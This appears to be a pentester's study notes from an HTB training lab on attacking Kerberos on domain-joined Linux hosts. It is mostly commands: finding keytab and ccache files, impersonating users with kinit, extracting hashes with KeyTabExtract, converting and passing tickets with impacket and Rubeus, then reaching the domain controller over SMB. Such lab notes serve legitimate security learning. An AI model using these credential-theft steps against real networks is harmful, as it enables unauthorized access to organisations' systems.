
Extra Info
[[Routing kerberos traffic]]


Check if machine is domain joined
```shell-session
>realm list
```
![[Pasted image 20240916105329.png]]


```shell-session
>ps -ef | grep -i "winbind\|sssd"
```
![[Pasted image 20240916105353.png]]

Finding kerberos tickets through keytab files
```shell-session
>find / -name *keytab* -ls 2>/dev/null
```
```shell-session
>klist -k -t
```
![[Pasted image 20240916110254.png]]
Search cronjobs for kerberos tickets
```shell-session
>crontab -l
```

Search ccache files for kerberos 
```shell-session
>env | grep -i krb5
```
```shell-session
>ls -la /tmp
```

![[Pasted image 20240916110926.png]]

```shell-session
>kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

>klist
```


###### Extracting Keytab Hashes with KeyTabExtract
```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
https://github.com/sosdave/KeyTabExtract


![[Pasted image 20240916115751.png]]
```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py


![[Pasted image 20240916115853.png]]
```cmd-session
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```


Linux mimikatz
https://github.com/CiscoCXSecurity/linikatz


Once we have a ticket we need to set the env variable to obtain the privilege's
	export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB

Once we have obtained ticket permissions we can use it to access resources on the domain controller
	smbclient //dc01/linux01 -k -c "ls" -no-pass